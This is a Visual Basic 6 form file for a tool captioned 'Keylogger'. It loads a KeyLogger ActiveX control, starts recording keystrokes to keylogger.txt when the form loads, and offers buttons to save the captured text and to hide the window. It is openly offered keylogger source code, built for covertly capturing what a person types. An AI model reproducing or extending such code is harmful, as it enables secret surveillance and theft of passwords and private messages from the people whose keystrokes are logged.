VERSION 5.00
Object = "{94C523F4-FF5F-11D3-9DC0-B64634946943}#2.0#0"; "KeyLogger.ocx"
Begin VB.Form Form12 
   Caption         =   "Keylogger"
   ClientHeight    =   3615
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   3540
   LinkTopic       =   "Form12"
   ScaleHeight     =   3615
   ScaleWidth      =   3540
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command2 
      Caption         =   "Save"
      Height          =   255
      Left            =   120
      TabIndex        =   2
      Top             =   0
      Width           =   1575
   End
   Begin KeyLogger_ActiveX.KeyLoggerOCX KeyLoggerOCX1 
      Left            =   3600
      Top             =   3000
      _ExtentX        =   979
      _ExtentY        =   926
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Hide"
      Height          =   255
      Left            =   1920
      TabIndex        =   1
      Top             =   0
      Width           =   1575
   End
   Begin VB.TextBox Text1 
      Height          =   3255
      Left            =   120
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   0
      Top             =   240
      Width           =   3375
   End
End
Attribute VB_Name = "Form12"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Sub Command1_Click()
Me.Hide
Form13.Show
End Sub


Private Sub Command2_Click()
KeyLoggerOCX1.SaveTextFile Text1.Text, "\keylogger.txt"
End Sub

Private Sub Form_Load()
KeyLoggerOCX1.Run "\keylogger.txt"
End Sub
